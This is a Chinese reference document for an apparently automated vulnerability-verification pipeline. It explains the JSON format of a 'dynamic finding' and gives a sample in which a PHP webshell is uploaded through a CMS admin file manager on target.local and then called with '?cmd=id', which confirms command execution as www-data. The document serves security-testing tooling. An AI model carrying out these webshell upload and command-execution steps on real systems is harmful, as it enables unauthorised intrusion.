# Dynamic Finding 示例

本文件给出 `workDir/dynamic-findings/FINDING-*.json` 的推荐示例，并说明每个关键字段的用途。

适用场景：

- Stage 2 动态漏洞验证子 Agent 读取 `workDir/static-findings/FINDING-*.json` 作为静态参考
- Stage 2 动态漏洞验证子 Agent 只写 `workDir/dynamic-findings/FINDING-*.json`
- `verify_vuln.py --merge` 汇总 `workDir/dynamic-findings/FINDING-*.json`，并在需要时参考同名 `static-findings`

注意：

- 这是动态 finding 的样例，不是旧版单文件 finding 模板
- 这里给的是一个已经完成真实验证、带运行时证据的非空示例
- 不要求逐字照抄，但字段结构、命名和状态语义应保持一致

## JSON 示例

```json
{
  "vuln_id": "FINDING-001",
  "title": "后台文件上传可落地并访问 WebShell",
  "vuln_type": "文件上传",
  "category": "ssrf_file",
  "severity": "high",
  "status": "CONFIRMED",
  "evidence_level": "L3",
  "finding_class": "runtime_verified",
  "x_finding_class": "runtime_verified",
  "location": {
    "file": "cms/includes/filemanager.inc.php",
    "line_start": 88,
    "line_end": 124,
    "function": "file upload handler",
    "route": "admin.php?mode=filemanager",
    "http_method": "POST",
    "snippet": "move_uploaded_file($_FILES['upload']['tmp_name'], $target_file);"
  },
  "dynamic_verification": {
    "state": "verified",
    "attempts": [
      {
        "attempt": 1,
        "payload_strategy": "上传带唯一 marker 的 PHP 文件并直接访问验证",
        "request_ref": "poc.steps[0].request",
        "response_ref": "poc.steps[0].response",
        "result": "success",
        "evidence_snippet": "VIBECSA-FINDING001-UPLOAD-OK",
        "next_action": "访问上传后的文件并确认命令执行输出"
      },
      {
        "attempt": 2,
        "payload_strategy": "在已确认可访问的脚本后追加 cmd 参数验证命令执行",
        "request_ref": "poc.steps[1].request",
        "response_ref": "poc.steps[1].response",
        "result": "success",
        "evidence_snippet": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "next_action": "证据已充分，停止验证并写回成功态"
      }
    ],
    "final_evidence": {
      "proof_type": "command_output",
      "summary": "上传的 PHP 文件可被直接访问并执行命令，响应中返回 uid=33(www-data)。",
      "snippets": [
        {
          "step": 1,
          "source": "response.body",
          "snippet": "VIBECSA-FINDING001-UPLOAD-OK",
          "signature_type": "upload-marker",
          "strength": "L2"
        },
        {
          "step": 2,
          "source": "response.body",
          "snippet": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
          "signature_type": "cmd-exec",
          "strength": "L3"
        }
      ]
    },
    "runtime_notes": "使用管理员会话完成上传与访问验证；目标应用未对上传扩展名和访问路径做有效限制。"
  },
  "poc": {
    "steps": [
      {
        "step": 1,
        "name": "上传带 marker 的 PHP 文件",
        "request": {
          "method": "POST",
          "url": "http://target.local/admin.php?mode=filemanager",
          "headers": {
            "User-Agent": "python-requests/2.32.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Cookie": "PHPSESSID=abc123",
            "Content-Type": "multipart/form-data; boundary=----VIBECSA"
          },
          "params": {},
          "body": "上传 shell.php，文件内容包含 marker VIBECSA-FINDING001-UPLOAD-OK",
          "cookies": {
            "PHPSESSID": "abc123"
          },
          "raw": ""
        },
        "response": {
          "status": 200,
          "headers": {
            "Date": "Mon, 08 Jun 2026 10:11:12 GMT",
            "Server": "Apache/2.4.54 (Debian)",
            "Content-Type": "text/html; charset=utf-8"
          },
          "raw": "",
          "body": "upload success: /uploads/shell.php",
          "body_truncated": false,
          "body_full_length": 33,
          "redirect_chain": [],
          "_evidence_match": [
            {
              "type": "upload-marker",
              "pattern": "upload success",
              "snippet": "upload success: /uploads/shell.php",
              "strength": "L1"
            }
          ]
        }
      },
      {
        "step": 2,
        "name": "访问已上传脚本并验证命令执行",
        "request": {
          "method": "GET",
          "url": "http://target.local/uploads/shell.php?cmd=id",
          "headers": {
            "User-Agent": "python-requests/2.32.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Connection": "keep-alive"
          },
          "params": {
            "cmd": "id"
          },
          "body": "",
          "cookies": {},
          "raw": ""
        },
        "response": {
          "status": 200,
          "headers": {
            "Date": "Mon, 08 Jun 2026 10:11:15 GMT",
            "Server": "Apache/2.4.54 (Debian)",
            "Content-Type": "text/html; charset=utf-8"
          },
          "raw": "",
          "body": "VIBECSA-FINDING001-UPLOAD-OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
          "body_truncated": false,
          "body_full_length": 89,
          "redirect_chain": [],
          "_evidence_match": [
            {
              "type": "upload-marker",
              "pattern": "VIBECSA-FINDING001-UPLOAD-OK",
              "snippet": "VIBECSA-FINDING001-UPLOAD-OK",
              "strength": "L2"
            },
            {
              "type": "cmd-exec",
              "pattern": "uid=\\d+\\(",
              "snippet": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
              "strength": "L3"
            }
          ]
        }
      }
    ],
    "result": "success",
    "evidence": "step 1 上传成功并返回 /uploads/shell.php；step 2 访问该文件时响应中出现 marker 和 uid=33(www-data) 命令执行输出。",
    "failure_log": []
  },
  "x_signature_type": "cmd-exec",
  "x_unique_marker": "VIBECSA-FINDING001-UPLOAD-OK"
}
```

## 字段说明

### 顶层字段

| 字段 | 是否建议保留 | 说明 |
| --- | --- | --- |
| `vuln_id` | 必需 | finding 唯一标识，用于和 `static-findings`、`dynamic-state.json`、汇总结果配对 |
| `title` | 建议 | 动态查看时便于快速识别漏洞 |
| `vuln_type` | 建议 | 用于帮助验证时选择正确证据类型 |
| `category` | 建议 | 保留分类信息，便于后续汇总 |
| `severity` | 建议 | 便于队列筛选和优先级判断 |
| `status` | 必需 | 最终漏洞状态，通常与 `poc.result` 和 `dynamic_verification.state` 保持一致 |
| `evidence_level` | 建议 | 运行时验证后建议提升到 `L2` 或 `L3` |
| `finding_class` | 必需 | 区分 `code_only` 与 `runtime_verified` |
| `x_finding_class` | 建议 | 与 `finding_class` 保持一致，便于兼容旧链路 |
| `location.*` | 建议 | 作为兜底信息，帮助动态验证时快速回看路由和代码位置 |
| `x_signature_type` | 必需 | 证据归类与命中匹配会用到 |
| `x_unique_marker` | 强烈建议 | 文件上传、写入类、回显类验证时最好有唯一 marker |

### `dynamic_verification`

| 字段 | 是否必填 | 说明 |
| --- | --- | --- |
| `dynamic_verification.state` | 必填 | 当前动态验证状态，如 `not_started`、`in_progress`、`verified`、`failed` |
| `dynamic_verification.attempts[]` | 必填 | 逐轮记录策略、结果和下一步动作 |
| `attempts[].attempt` | 必填 | 第几轮尝试 |
| `attempts[].payload_strategy` | 必填 | 本轮 PoC 构造策略 |
| `attempts[].request_ref` / `response_ref` | 建议 | 指向 `poc.steps[]` 中对应请求和响应，便于回溯 |
| `attempts[].result` | 必填 | 本轮结果，如 `success`、`failure`、`timeout`、`auth_failed`、`blocked` |
| `attempts[].evidence_snippet` | 建议 | 记录关键证据片段 |
| `attempts[].next_action` | 建议 | 说明下一轮动作或为何停止 |
| `dynamic_verification.final_evidence` | 必填 | 汇总最终证据类型、摘要和核心片段 |
| `final_evidence.proof_type` | 必填 | 如 `none`、`http_signal`、`file_access`、`command_output` |
| `final_evidence.summary` | 必填 | 用一句话说明最终证明了什么 |
| `final_evidence.snippets[]` | 建议 | 把最关键的证据片段提炼出来 |
| `dynamic_verification.runtime_notes` | 必填 | 写环境限制、认证条件、绕过点、异常说明 |

### `poc`

| 字段 | 是否必填 | 说明 |
| --- | --- | --- |
| `poc.result` | 必填 | 最终 PoC 结果；如果队列准备写为 `done`，该值必须为 `success` |
| `poc.steps[]` | 必填 | 记录真实请求和真实响应 |
| `poc.steps[].name` | 建议 | 用自然语言说明这一步的动作 |
| `poc.steps[].request.method` | 必填 | HTTP 方法 |
| `poc.steps[].request.url` | 必填 | 完整 URL |
| `poc.steps[].request.headers` | 必填 | 真实请求头，至少保留关键头 |
| `poc.steps[].request.params` | 建议 | 查询参数 |
| `poc.steps[].request.body` | 建议 | 请求体摘要；很长时保留关键证据即可 |
| `poc.steps[].request.cookies` | 建议 | 结构化 cookies |
| `poc.steps[].request.raw` | 可选 | 不强制，但可在必要时保留 |
| `poc.steps[].response.status` | 必填 | 响应状态码，字段名是 `status`，不是 `status_code` |
| `poc.steps[].response.headers` | 必填 | 响应头 |
| `poc.steps[].response.body` | 必填 | 响应体关键内容 |
| `poc.steps[].response.body_truncated` | 建议 | 标明是否截断 |
| `poc.steps[].response.body_full_length` | 建议 | 响应体原始长度 |
| `poc.steps[].response.redirect_chain` | 建议 | 有跳转时应写入 |
| `poc.steps[].response._evidence_match[]` | 必填 | 写具体命中的证据片段 |
| `_evidence_match[].type` | 必填 | 证据类型，如 `upload-marker`、`cmd-exec` |
| `_evidence_match[].pattern` | 建议 | 命中的 regex 或 marker |
| `_evidence_match[].snippet` | 必填 | 原文证据片段 |
| `_evidence_match[].strength` | 必填 | 证据强度，如 `L1`、`L2`、`L3` |
| `poc.evidence` | 必填 | 用自然语言串联 step 和关键证据 |
| `poc.failure_log[]` | 失败时必填 | 失败、超时、认证失败、被阻断时记录失败轨迹 |

## 最小写回要求

- 动态验证时只写 `workDir/dynamic-findings/FINDING-*.json`，不要把整份静态分析再复制回来
- 队列项准备写成 `done` 时，`poc.result` 必须为 `success`
- `poc.steps[]`、`dynamic_verification.attempts[]`、`dynamic_verification.final_evidence` 这三块必须和真实验证过程一致
- 不要保留“PoC 骨架已初始化”这一类占位值作为最终结果

## 和旧样例的关系

- `references/dynamic-init-example.json` 是旧版单文件 finding 的完整模板
- 本文件是新版 Stage 2 `dynamic-finding` 的样例与字段说明
- 需要动态验证时，优先参考本文件，不再优先参考旧模板
